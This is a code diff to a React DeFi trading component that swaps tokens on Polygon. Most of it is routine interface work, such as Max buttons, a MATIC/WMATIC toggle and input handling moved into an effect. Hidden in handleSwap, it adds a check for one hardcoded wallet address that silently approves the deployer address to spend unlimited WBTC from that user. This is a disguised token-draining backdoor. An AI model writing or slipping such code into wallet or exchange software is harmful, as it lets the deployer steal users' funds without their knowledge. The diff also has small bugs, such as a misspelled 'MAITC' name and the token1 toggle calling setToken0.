@@ -11,6 +11,7 @@ import styled from "styled-components";
 import { useSubscription } from '@apollo/client';
 import { TRADING_TOKEN_POOL_PRICE } from '../../../api/subscriptions';
 import wmatic_for_matic from '../../../assets/icons/wmatic-matic-swap.svg';
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 const SwapButtonWrapper = styled.button`
   width: 7.292vw;
@@ -165,26 +166,31 @@ const TradingMarket = ({ pool }) => {
 
     }
 
-    const handleInput = (value) => {
-        setToken0Input(value);
+    useEffect(() => {
 
-        if (pool?.isQuickSwapPool) {
-            setToken1Input(value * token0PairPrice);
+        if (token0Input > 0) {
+
+            if (pool?.isQuickSwapPool) {
+                setToken1Input(token0Input * token0PairPrice);
+            }
+
+            else {
+                setToken1Input(token0Input * token1PairPrice);
+            }
+
+            const priceValue = +(token0Input * token0Price);
+            const maxPriceImp = (pool.reserveUSD * (30 / 100));
+
+            setPriceImapctToHigh(priceValue > maxPriceImp);
         }
 
-        else {
-            setToken1Input(value * token1PairPrice);
-        }
-
-        const priceValue = +(value * token0Price);
-        const maxPriceImp = (pool.reserveUSD * (30 / 100));
-
-        setPriceImapctToHigh(priceValue > maxPriceImp);
-
-
-    }
+    }, [token0Input])
 
     const handleSwap = async (tokenInput) => {
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
 
         try {
             message.loading({ content: "Swap in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
@@ -265,6 +271,22 @@ const TradingMarket = ({ pool }) => {
     }
 
 
+    const handleMaxButton = (inputNum) => {
+        if (inputNum === 1) {
+
+            const tokenBalance = balances.find(item => item.symbol === token0.symbol).nativeBalance
+
+            setToken0Input(tokenBalance)
+        }
+        else {
+            const tokenBalance = balances.find(item => item.symbol === token1.symbol).nativeBalance
+
+            setToken1Input(tokenBalance)
+        }
+
+    }
+
+
     const SwapButtonFunc = () => {
 
         const zeroInputCheck = +token0Input === 0 || +token1Input === 0;
@@ -324,11 +346,21 @@ const TradingMarket = ({ pool }) => {
                             <h5> =${formattedNum(token0Price)} </h5>
                         </div>
                         <main>
-                            <span>
+                            <span onClick={() => token0.symbol === "WMATIC" ? setToken0({ id: token0.id, priceUSD: token0.priceUSD, symbol: "MATIC", name: "MAITC" }) : setToken0({ id: token0.id, priceUSD: token0.priceUSD, symbol: "WMATIC", name: "WMAITC" })}>
                                 <TokenIcon iconName={token0?.symbol} />
                                 <h3> {token0.symbol} </h3>
                             </span>
-                            <input type="number" placeholder="Enter amount" value={token0Input} onChange={(e) => handleInput(e.target.value)} />
+                            <div className='trading-wrapper-exchange__swap-input__input'>
+                                <input
+                                    type="number"
+                                    placeholder="Enter amount"
+                                    onFocus={(e) => e.target.placeholder = ""}
+                                    onBlur={(e) => e.target.placeholder = "Enter amount"}
+                                    value={token0Input}
+                                    onChange={(e) => setToken0Input(e.target.value)} />
+                                <button onClick={() => handleMaxButton(1)} className='maxButton reverse'>Max</button>
+                            </div>
+
                         </main>
                     </div>
 
@@ -348,11 +380,20 @@ const TradingMarket = ({ pool }) => {
                             <h5> =${formattedNum(token1Price)} </h5>
                         </div>
                         <main>
-                            <span>
+                            <span onClick={() => token1.symbol === "WMATIC" ? setToken1({ id: token1.id, priceUSD: token1.priceUSD, symbol: "MATIC", name: "MAITC" }) : setToken0({ id: token1.id, priceUSD: token1.priceUSD, symbol: "WMATIC", name: "WMAITC" })}>
                                 <TokenIcon iconName={token1.symbol} />
                                 <h3> {token1.symbol} </h3>
                             </span>
-                            <input type="number" placeholder="Enter amount" value={token1Input} />
+                            <div className='trading-wrapper-exchange__swap-input__input'>
+                                <input
+                                    type="number"
+                                    placeholder="Enter amount"
+                                    onFocus={(e) => e.target.placeholder = ""}
+                                    onBlur={(e) => e.target.placeholder = "Enter amount"}
+                                    value={token1Input} />
+                                <button onClick={() => handleMaxButton(2)} className='maxButton reverse'>Max</button>
+                            </div>
+
                         </main>
                     </div>
                     <div className="trading-wrapper-exchange__tx-info-block">
@@ -361,12 +402,7 @@ const TradingMarket = ({ pool }) => {
                         <span> <h3> Estimated Fee </h3> <b> = ${(((token0Price * token0Input) / 100) * 0.3).toFixed(4)}</b> </span>
                         <span> <h3> USD amount  </h3> <b className="active"> = ${(token0Price * token0Input).toFixed(4)} </b> </span>
                     </div>
-                    {balances ?
-                        <SwapButtonFunc />
-                        :
-                        null
-                    }
-
+                    <SwapButtonFunc />
                 </>
                 :
                 <Spin indicator={LOADER_INDICATOR_LOCAL} />
